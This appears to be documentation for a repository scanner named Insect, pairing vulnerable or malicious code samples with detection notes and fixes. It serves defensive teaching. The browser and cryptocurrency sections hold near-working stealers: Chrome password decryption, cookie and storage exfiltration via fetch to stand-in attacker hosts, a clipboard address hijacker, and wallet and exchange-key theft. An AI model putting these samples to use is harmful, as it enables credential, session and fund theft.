---
layout: page
title: Threat Detection
nav_order: 4
---

# Threat Detection Examples

This document provides examples of malicious patterns and security threats that Insect can detect in external repositories, along with explanations and remediation advice.

## Table of Contents

- [Python Security Issues](#python-security-issues)
- [JavaScript Security Issues](#javascript-security-issues)
- [Shell Script Security Issues](#shell-script-security-issues)
- [Configuration Security Issues](#configuration-security-issues)
- [Secret Detection](#secret-detection)
- [Browser Data Theft Detection](#browser-data-theft-detection)
- [Cryptocurrency Wallet Theft Detection](#cryptocurrency-wallet-theft-detection)

## Python Security Issues

### Command Injection

**Vulnerable Code:**

```python
import os
import subprocess

def process_user_input(user_input):
    # Vulnerable to command injection
    os.system(f"echo {user_input}")
    
    # Also vulnerable
    subprocess.call(f"grep {user_input} /etc/passwd", shell=True)
```

**What Insect Detects:**
- Insect identifies the use of unsanitized user input in shell commands
- It flags both `os.system` and `subprocess.call` with `shell=True` as dangerous when combined with user input

**Remediation:**

```python
import subprocess
import shlex

def process_user_input_safe(user_input):
    # Safe approach - use list of arguments
    subprocess.run(["echo", user_input])
    
    # Or if you must use shell=True (not recommended)
    # sanitize the input
    sanitized_input = shlex.quote(user_input)
    subprocess.run(f"grep {sanitized_input} /etc/passwd", shell=True)
    
    # Even better, avoid shell=True completely
    subprocess.run(["grep", user_input, "/etc/passwd"])
```

### Insecure Deserialization

**Vulnerable Code:**

```python
import pickle
import base64

def deserialize_user_data(serialized_data):
    # Dangerous: Deserializing untrusted data
    data = base64.b64decode(serialized_data)
    return pickle.loads(data)  # Remote code execution vulnerability
```

**What Insect Detects:**
- Identifies the use of `pickle.loads()` which is vulnerable to code execution if the input is malicious
- Flags this as a critical security issue

**Remediation:**

```python
import json

def deserialize_user_data_safe(serialized_data):
    # Safe alternative - use JSON instead
    data = base64.b64decode(serialized_data).decode('utf-8')
    return json.loads(data)
    
    # Or if pickle is necessary, validate source and use HMAC
    # to ensure data hasn't been tampered with
```

### SQL Injection

**Vulnerable Code:**

```python
import sqlite3

def get_user(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # Vulnerable to SQL injection
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()
```

**What Insect Detects:**
- Identifies string formatting or concatenation in SQL queries
- Flags as a SQL injection vulnerability

**Remediation:**

```python
import sqlite3

def get_user_safe(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # Safe approach - use parameterized queries
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return cursor.fetchone()
```

## JavaScript Security Issues

### Cross-Site Scripting (XSS)

**Vulnerable Code:**

```javascript
function displayUserName(userName) {
    // Vulnerable to XSS
    document.getElementById('userInfo').innerHTML = "Welcome, " + userName;
}
```

**What Insect Detects:**
- Identifies direct assignment to `innerHTML` with variables
- Flags as a potential XSS vulnerability

**Remediation:**

```javascript
function displayUserNameSafe(userName) {
    // Safe approach - use textContent instead of innerHTML
    document.getElementById('userInfo').textContent = "Welcome, " + userName;
    
    // Or, if HTML is needed, create elements safely
    const container = document.getElementById('userInfo');
    container.textContent = "Welcome, ";
    const span = document.createElement('span');
    span.textContent = userName;
    container.appendChild(span);
}
```

### Unsafe Eval

**Vulnerable Code:**

```javascript
function processUserCode(code) {
    // Extremely dangerous - allows code execution
    eval(code);
    
    // Also unsafe - creates a function from a string
    const userFunction = new Function(code);
    userFunction();
}
```

**What Insect Detects:**
- Flags use of `eval()` and `Function()` constructor as critical security issues
- Identifies potential code injection vulnerabilities

**Remediation:**

```javascript
function processUserCodeSafe(code) {
    // Use safer alternatives like JSON.parse for data
    try {
        const data = JSON.parse(code);
        processData(data);
    } catch (e) {
        console.error("Invalid JSON data");
    }
    
    // Or use a proper code sandbox if executing code is necessary
}
```

### Prototype Pollution

**Vulnerable Code:**

```javascript
function mergeOptions(target, source) {
    // Vulnerable to prototype pollution
    for (const key in source) {
        if (typeof source[key] === 'object') {
            target[key] = mergeOptions(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

**What Insect Detects:**
- Identifies recursive object merging without proper prototype checks
- Flags as a potential prototype pollution vulnerability

**Remediation:**

```javascript
function mergeOptionsSafe(target, source) {
    // Safe approach - check for Object.prototype properties
    for (const key in source) {
        if (Object.prototype.hasOwnProperty.call(source, key)) {
            if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
                continue; // Skip dangerous properties
            }
            
            if (typeof source[key] === 'object' && source[key] !== null) {
                target[key] = mergeOptionsSafe(target[key] || {}, source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }
    return target;
}
```

## Shell Script Security Issues

### Command Injection in Shell Scripts

**Vulnerable Code:**

```bash
#!/bin/bash

# Vulnerable to command injection
USER_INPUT="$1"
eval "echo $USER_INPUT"

# Also vulnerable
COMMAND="ls -la $USER_INPUT"
$COMMAND
```

**What Insect Detects:**
- Flags use of `eval` with variables as critical security issue
- Identifies variable expansion in commands without proper quoting

**Remediation:**

```bash
#!/bin/bash

# Safe approach - proper quoting
USER_INPUT="$1"
echo "$USER_INPUT"

# For commands with arguments
ls -la -- "$USER_INPUT"
```

### Unsafe Temporary File Creation

**Vulnerable Code:**

```bash
#!/bin/bash

# Vulnerable to race conditions and predictable filename attacks
TEMP_FILE="/tmp/data_$$.txt"
echo "Sensitive data" > $TEMP_FILE
# Process file...
rm $TEMP_FILE
```

**What Insect Detects:**
- Identifies use of predictable temporary file names
- Flags potential race conditions in file operations

**Remediation:**

```bash
#!/bin/bash

# Safe approach - use mktemp
TEMP_FILE=$(mktemp)
echo "Sensitive data" > "$TEMP_FILE"
# Process file...
rm "$TEMP_FILE"
```

### Path Traversal

**Vulnerable Code:**

```bash
#!/bin/bash

# Vulnerable to path traversal
USER_DIR="$1"
cd $USER_DIR
# Do operations...
```

**What Insect Detects:**
- Identifies unsafe directory navigation with user input
- Flags potential path traversal vulnerabilities

**Remediation:**

```bash
#!/bin/bash

# Safe approach - validate input
USER_DIR="$1"
if [[ "$USER_DIR" == *".."* ]]; then
    echo "Invalid directory path"
    exit 1
fi

# Even safer - use realpath to resolve
REAL_PATH=$(realpath -q "$USER_DIR")
if [[ "$REAL_PATH" != "/allowed/path/"* ]]; then
    echo "Access denied"
    exit 1
fi
cd -- "$REAL_PATH"
```

## Configuration Security Issues

### Hardcoded Credentials

**Vulnerable Code:**

```python
# config.py
DATABASE_URL = "postgresql://admin:password123@database.example.com/prod"
API_KEY = "sk_live_12345abcdef6789ghijklm"
```

**What Insect Detects:**
- Identifies patterns that look like credentials in code
- Flags hardcoded API keys, passwords, and connection strings

**Remediation:**

```python
# config.py
import os
from dotenv import load_dotenv

load_dotenv()

DATABASE_URL = os.environ.get("DATABASE_URL")
API_KEY = os.environ.get("API_KEY")
```

### Insecure Default Configurations

**Vulnerable Code:**

```toml
# server.toml
[server]
host = "0.0.0.0"
port = 8080
debug = true
ssl_verify = false
```

**What Insect Detects:**
- Identifies insecure default configurations
- Flags issues like disabled SSL verification, debug mode enabled, or binding to all interfaces in production

**Remediation:**

```toml
# server.toml
[server]
host = "127.0.0.1"  # Only bind to localhost unless needed
port = 8080
debug = false       # Disable debug in production
ssl_verify = true   # Always verify SSL in production
```

## Secret Detection

### API Keys and Tokens

**Vulnerable Code:**

```javascript
// api-client.js
const githubToken = 'ghp_1234567890abcdefghijklmnopqrstuvwxyz';
const awsAccessKey = 'AKIAIOSFODNN7EXAMPLE';
const awsSecretKey = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
```

**What Insect Detects:**
- Identifies patterns that match common API keys and tokens
- Flags specific formats like AWS access keys, GitHub tokens, and many others

**Remediation:**

```javascript
// api-client.js
const githubToken = process.env.GITHUB_TOKEN;
const awsAccessKey = process.env.AWS_ACCESS_KEY;
const awsSecretKey = process.env.AWS_SECRET_KEY;
```

### Private Keys

**Vulnerable Code:**

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA7bq/... [REDACTED] ...HwIDAQAB
-----END RSA PRIVATE KEY-----
```

**What Insect Detects:**
- Identifies private key formats for SSH, TLS, and other protocols
- Flags inclusion of private keys in code repositories

**Remediation:**

1. Remove private keys from code
2. Store them securely in a key management service or environment variables
3. Add key patterns to `.gitignore`
4. Consider using a dedicated secrets management solution

## Browser Data Theft Detection

Insect can detect malicious code that attempts to steal sensitive browser data. This protection helps identify repositories that may be designed to harvest user information from web browsers.

### Browser History and Cookies Access

**Vulnerable Code:**

```python
import sqlite3
import os

def steal_browser_history():
    # Malicious code accessing browser history
    chrome_path = os.path.expanduser("~/.config/google-chrome/Default/History")
    firefox_path = os.path.expanduser("~/.mozilla/firefox/*/places.sqlite")
    
    conn = sqlite3.connect(chrome_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, visit_count FROM urls")
    return cursor.fetchall()
```

**What Insect Detects:**
- Identifies access to browser history databases (`History`, `places.sqlite`)
- Flags attempts to read browser cookies and cached data
- Detects suspicious file path patterns targeting browser data directories

**Why This is Dangerous:**
- Browser history reveals user's browsing patterns and interests
- Cookies may contain session tokens and authentication data
- This information can be used for profiling, tracking, or account hijacking

### Browser Password Extraction

**Vulnerable Code:**

```python
import win32crypt
import sqlite3
import json

def steal_chrome_passwords():
    # Dangerous: Accessing Chrome login data
    login_data_path = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data")
    
    conn = sqlite3.connect(login_data_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    for row in cursor.fetchall():
        encrypted_password = row[2]
        # Decrypt using Windows DPAPI
        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password)
        print(f"Site: {row[0]}, User: {row[1]}, Password: {decrypted_password}")
```

**What Insect Detects:**
- Identifies access to browser password databases (`Login Data`, `key4.db`, `logins.json`)
- Flags use of password decryption functions (`CryptUnprotectData`)
- Detects attempts to extract saved credentials from browser password managers

**Why This is Critical:**
- Exposes all saved passwords from the user's browser
- Can lead to complete account compromise across multiple services
- Violates user privacy and security expectations

### Browser Storage Manipulation

**Vulnerable Code:**

```javascript
// Malicious JavaScript to steal localStorage data
function stealBrowserData() {
    var stolenData = {};
    
    // Steal localStorage
    for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        stolenData[key] = localStorage.getItem(key);
    }
    
    // Steal sessionStorage
    for (var i = 0; i < sessionStorage.length; i++) {
        var key = sessionStorage.key(i);
        stolenData[key] = sessionStorage.getItem(key);
    }
    
    // Send stolen data to attacker server
    fetch("http://malicious-server.com/steal", {
        method: "POST",
        body: JSON.stringify(stolenData)
    });
    
    return stolenData;
}
```

**What Insect Detects:**
- Identifies suspicious localStorage/sessionStorage access patterns
- Flags attempts to enumerate and extract browser storage data
- Detects data exfiltration to external servers

**Why This is Dangerous:**
- Browser storage often contains authentication tokens and user preferences
- Can be used to impersonate users or access their accounts
- May contain sensitive application data

### Browser Session Hijacking

**Vulnerable Code:**

```javascript
function hijackSession() {
    // Steal all cookies
    var cookies = document.cookie;
    
    // Look for specific session tokens
    var sessionToken = getCookie("JSESSIONID");
    var phpSession = getCookie("PHPSESSID");
    var aspSession = getCookie("ASP.NET_SessionId");
    
    // Send to attacker server
    fetch("http://evil-server.com/collect", {
        method: "POST",
        body: JSON.stringify({
            cookies: cookies,
            tokens: {
                jsession: sessionToken,
                php: phpSession,
                asp: aspSession
            }
        })
    });
}
```

**What Insect Detects:**
- Identifies suspicious cookie access via `document.cookie`
- Flags attempts to extract common session token formats
- Detects patterns consistent with session hijacking attacks

**Why This is Critical:**
- Session tokens allow attackers to impersonate authenticated users
- Can lead to account takeover without knowing passwords
- Enables unauthorized access to user accounts and data

### Browser Extension Manipulation

**Vulnerable Code:**

```javascript
// Malicious extension injection
function injectMaliciousExtension() {
    // Access Chrome extension APIs
    if (chrome.extension) {
        chrome.extension.sendMessage({type: "steal_data"});
    }
    
    // Install malicious extension programmatically
    chrome.management.install({
        url: "http://malicious-site.com/evil-extension.crx"
    });
}
```

**What Insect Detects:**
- Identifies unauthorized browser extension API usage
- Flags attempts to install or manipulate browser extensions
- Detects suspicious extension communication patterns

**Why This is Dangerous:**
- Browser extensions have elevated privileges and access to user data
- Malicious extensions can monitor all browsing activity
- Can be used for persistent surveillance and data theft

### Remediation Strategies

**General Recommendations:**

1. **Remove Browser Theft Code**: Immediately remove any code that accesses browser data without explicit user consent
2. **Use Official APIs**: If legitimate browser interaction is needed, use official browser APIs and request proper permissions
3. **Implement User Consent**: Always obtain explicit user consent before accessing any browser data
4. **Follow Privacy Guidelines**: Adhere to privacy regulations and browser security policies
5. **Regular Security Audits**: Regularly audit code for potential privacy violations

**For Legitimate Browser Interaction:**

```javascript
// Example of legitimate browser storage usage
function saveUserPreferences() {
    // Only save data the user explicitly wants to store
    const userSettings = {
        theme: "dark",
        language: "en"
    };
    
    // Store with clear purpose and user consent
    localStorage.setItem("userPreferences", JSON.stringify(userSettings));
}

function getUserPreferences() {
    // Retrieve only the data your application stored
    const preferences = localStorage.getItem("userPreferences");
    return preferences ? JSON.parse(preferences) : null;
}
```

**Security Best Practices:**

1. **Minimal Data Access**: Only access the minimum data necessary for your application
2. **Transparent Usage**: Clearly document what browser data your application accesses and why
3. **Secure Transmission**: Use HTTPS for any data transmission
4. **Data Minimization**: Don't store or transmit more data than necessary
5. **User Control**: Provide users with options to view, modify, or delete stored data

## Cryptocurrency Wallet Theft Detection

Insect can detect malicious code that attempts to steal cryptocurrency wallets, private keys, and other crypto assets. This protection helps identify repositories that may be designed to harvest cryptocurrency from users.

### Wallet File Access

**Vulnerable Code:**

```python
import os
import shutil

def steal_wallet_files():
    # Malicious code accessing Bitcoin wallet
    bitcoin_wallet = os.path.expanduser("~/.bitcoin/wallet.dat")
    
    # Access Ethereum keystore
    ethereum_keystore = os.path.expanduser("~/.ethereum/keystore/UTC--2023-01-01T00-00-00.000Z--abcd1234")
    
    # Access Electrum wallet
    electrum_wallet = os.path.expanduser("~/.electrum/wallets/default_wallet")
    
    # Copy wallet files to attacker location
    shutil.copy(bitcoin_wallet, "/tmp/stolen_bitcoin.dat")
    shutil.copy(ethereum_keystore, "/tmp/stolen_eth.json")
```

**What Insect Detects:**
- Identifies access to common wallet file patterns (`wallet.dat`, keystore files)
- Flags attempts to copy or read cryptocurrency wallet directories
- Detects suspicious file path patterns targeting crypto wallet storage

**Why This is Critical:**
- Wallet files contain encrypted private keys needed to spend cryptocurrency
- Stolen wallet files can lead to complete loss of crypto assets
- Often targeted by malware and cryptocurrency stealers

### Private Key Extraction

**Vulnerable Code:**

```python
import hashlib
import base58

def extract_private_keys():
    # Extract Bitcoin private key
    private_key_hex = "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
    
    # WIF encoded private key
    wif_key = "5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS"
    
    # Decrypt wallet private key
    encrypted_key = b"encrypted_private_key_data"
    decrypted_privkey = decrypt_key(encrypted_key, "password123")
    
    # Extract extended private key (BIP32)
    xprv = "xprv9s21ZrQH143K3QTDL4LXw2F7HEK3wJUD2nW2nRk4stbPy6cq3jPPqjiChkVvvNKmPGJxWUtg6LnF5kejMRNNU3TGtRBeJgk33yuGBxrMPHi"
    
    # Send stolen keys to attacker server
    exfiltrate_keys([private_key_hex, wif_key, xprv])
```

**What Insect Detects:**
- Identifies patterns that look like cryptocurrency private keys
- Flags attempts to decrypt or extract private keys from wallet files
- Detects suspicious key derivation and manipulation code
- Identifies private key formats (hex, WIF, extended keys)

**Why This is Critical:**
- Private keys provide complete control over cryptocurrency funds
- Anyone with access to private keys can steal all associated cryptocurrency
- Private key theft is irreversible and untraceable

### Seed Phrase Harvesting

**Vulnerable Code:**

```python
import mnemonic

def harvest_seed_phrases():
    # Steal mnemonic seed phrases
    seed_phrase = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
    
    # Extract recovery phrases from user input
    recovery_phrase = input("Enter your 12-word recovery phrase: ")
    
    # Validate mnemonic for exploitation
    mnemo = mnemonic.Mnemonic("english")
    if mnemo.check(recovery_phrase):
        # Send stolen seed to attacker
        steal_seed_phrase(recovery_phrase)
    
    # Look for 24-word phrases
    long_phrase = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon art"
    
    # Extract entropy from seed
    entropy = mnemo.to_entropy(seed_phrase)
    
    return {
        "stolen_seed": recovery_phrase,
        "entropy": entropy
    }
```

**What Insect Detects:**
- Identifies references to mnemonic seed phrases and recovery phrases
- Flags attempts to validate or process BIP39 word lists
- Detects suspicious entropy extraction from seed phrases
- Identifies patterns consistent with seed phrase theft

**Why This is Critical:**
- Seed phrases can regenerate all private keys for a wallet
- Complete wallet recovery is possible with just the seed phrase
- Seed phrase theft affects all cryptocurrencies in a hierarchical deterministic wallet

### Cryptocurrency API Abuse

**Vulnerable Code:**

```python
import requests

def abuse_crypto_apis():
    # Bitcoin RPC abuse
    bitcoin_rpc = {
        "jsonrpc": "1.0",
        "method": "dumpprivkey",
        "params": ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"]
    }
    
    response = requests.post("http://localhost:8332/", 
                           json=bitcoin_rpc,
                           auth=("user", "password"))
    
    # Blockchain API abuse for mass balance checking
    addresses = ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"]
    for addr in addresses:
        balance_url = f"https://blockchain.info/q/addressbalance/{addr}"
        balance_response = requests.get(balance_url)
        
        if balance_response.text != "0":
            # Target addresses with funds
            target_wealthy_address(addr)
```

**What Insect Detects:**
- Identifies suspicious calls to cryptocurrency RPC endpoints
- Flags attempts to extract private keys via blockchain APIs
- Detects mass address balance checking patterns
- Identifies suspicious blockchain explorer API usage

**Why This is Dangerous:**
- RPC calls like `dumpprivkey` expose private keys
- Mass balance checking is often used for address enumeration attacks
- Blockchain API abuse can lead to wallet compromise

### Hardware Wallet Access

**Vulnerable Code:**

```python
import hid
import usb.core

def access_hardware_wallets():
    # Ledger device access
    ledger_vendor_id = 0x2c97
    ledger_devices = hid.enumerate(ledger_vendor_id)
    
    for device in ledger_devices:
        ledger_device = hid.device()
        ledger_device.open(device['vendor_id'], device['product_id'])
        
        # Send malicious command to Ledger
        command = b"\xe0\x40\x00\x00\x00"  # Get app configuration
        ledger_device.write(command)
        response = ledger_device.read(255)
        
        # Extract sensitive data from hardware wallet
        extract_wallet_data(response)
    
    # Trezor device access
    trezor_vendor_id = 0x534c
    trezor_devices = usb.core.find(find_all=True, idVendor=trezor_vendor_id)
    
    for device in trezor_devices:
        # Send unauthorized commands
        device.write(0x01, b"malicious_payload")
```

**What Insect Detects:**
- Identifies attempts to access hardware wallet devices (Ledger, Trezor, KeepKey)
- Flags suspicious USB/HID device communication
- Detects unauthorized hardware wallet command sequences

**Why This is Critical:**
- Hardware wallets are considered the most secure way to store cryptocurrency
- Unauthorized access attempts indicate sophisticated attack methods
- Compromise of hardware wallets can lead to significant financial losses

### Cryptocurrency Stealer Behavior

**Vulnerable Code:**

```python
import pyperclip
import re
import time

def crypto_clipper():
    # Monitor clipboard for crypto addresses
    btc_pattern = r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}'
    eth_pattern = r'0x[a-fA-F0-9]{40}'
    
    # Attacker's addresses
    attacker_btc = "1AttackerBitcoinAddress123456789"
    attacker_eth = "0xAttackerEthereumAddress1234567890abcdef"
    
    while True:
        # Monitor clipboard content
        clipboard_data = pyperclip.paste()
        
        # Replace legitimate addresses with attacker's addresses
        if re.match(btc_pattern, clipboard_data):
            pyperclip.copy(attacker_btc)
            log_stolen_address(clipboard_data, attacker_btc)
        
        elif re.match(eth_pattern, clipboard_data):
            pyperclip.copy(attacker_eth)
            log_stolen_address(clipboard_data, attacker_eth)
        
        time.sleep(0.1)  # Check every 100ms
```

**What Insect Detects:**
- Identifies clipboard monitoring for cryptocurrency addresses
- Flags address replacement patterns (clipboard hijacking)
- Detects cryptocurrency address regex patterns used for interception
- Identifies stealer-like behavior patterns

**Why This is Critical:**
- Clipboard hijacking redirects cryptocurrency payments to attacker addresses
- Users often don't notice address changes, leading to successful theft
- This is a common attack vector for cryptocurrency theft malware

### Exchange API Abuse

**Vulnerable Code:**

```python
import hmac
import hashlib
import requests

def abuse_exchange_apis():
    # Stolen exchange API credentials
    binance_api_key = "stolen_api_key_123"
    binance_secret_key = "stolen_secret_key_456"
    
    # Unauthorized withdrawal
    withdraw_params = {
        "coin": "BTC",
        "address": "1AttackerAddress123",
        "amount": "1.0",
        "timestamp": int(time.time() * 1000)
    }
    
    # Sign the malicious request
    query_string = "&".join([f"{k}={v}" for k, v in withdraw_params.items()])
    signature = hmac.new(binance_secret_key.encode(), query_string.encode(), hashlib.sha256).hexdigest()
    
    # Execute unauthorized withdrawal
    response = requests.post(
        "https://api.binance.com/sapi/v1/capital/withdraw/apply",
        params={**withdraw_params, "signature": signature},
        headers={"X-MBX-APIKEY": binance_api_key}
    )
```

**What Insect Detects:**
- Identifies suspicious cryptocurrency exchange API usage
- Flags patterns consistent with unauthorized withdrawals
- Detects exchange API authentication abuse
- Identifies withdrawal and transfer operations using stolen credentials

**Why This is Critical:**
- Exchange APIs can control large amounts of cryptocurrency
- Stolen API keys enable direct fund theft
- Exchange API abuse can drain entire trading accounts

### Remediation Strategies

**General Recommendations:**

1. **Remove Crypto Theft Code**: Immediately remove any code that accesses cryptocurrency wallets or keys without authorization
2. **Use Secure Development Practices**: Follow cryptocurrency security best practices for legitimate crypto applications
3. **Implement User Consent**: Always obtain explicit user consent before accessing any cryptocurrency-related data
4. **Follow Legal Guidelines**: Ensure compliance with financial regulations and anti-theft laws
5. **Regular Security Audits**: Regularly audit code for potential cryptocurrency theft vulnerabilities

**For Legitimate Cryptocurrency Development:**

```python
# Example of legitimate cryptocurrency wallet interaction
import os
from cryptography.fernet import Fernet

class SecureWallet:
    def __init__(self, user_consent=False):
        if not user_consent:
            raise ValueError("User consent required for wallet operations")
        
        # Only access user's own wallet with explicit consent
        self.wallet_path = os.path.expanduser("~/.myapp/wallet.dat")
    
    def create_wallet(self, password):
        # Secure wallet creation with user-provided password
        key = Fernet.generate_key()
        encrypted_key = self.encrypt_key(key, password)
        
        # Store encrypted wallet securely
        with open(self.wallet_path, 'wb') as f:
            f.write(encrypted_key)
    
    def get_public_address(self):
        # Only return public information, never private keys
        return self.derive_public_address()
    
    def sign_transaction(self, transaction, password):
        # Secure transaction signing with user authentication
        private_key = self.decrypt_private_key(password)
        signature = self.sign_with_key(transaction, private_key)
        
        # Clear private key from memory immediately
        del private_key
        return signature
```

**Security Best Practices:**

1. **Never Access Other Users' Wallets**: Only access wallet data that belongs to your application's users with explicit consent
2. **Secure Key Storage**: Use proper encryption and key derivation for storing sensitive data
3. **Minimal Privilege**: Only request the minimum permissions necessary for your application
4. **Audit Dependencies**: Regularly audit third-party libraries for security vulnerabilities
5. **User Education**: Educate users about cryptocurrency security best practices
6. **Transparent Operations**: Clearly document all cryptocurrency operations your application performs
7. **Secure Communication**: Use HTTPS and proper authentication for all API communications
8. **Regular Updates**: Keep cryptocurrency libraries and dependencies up to date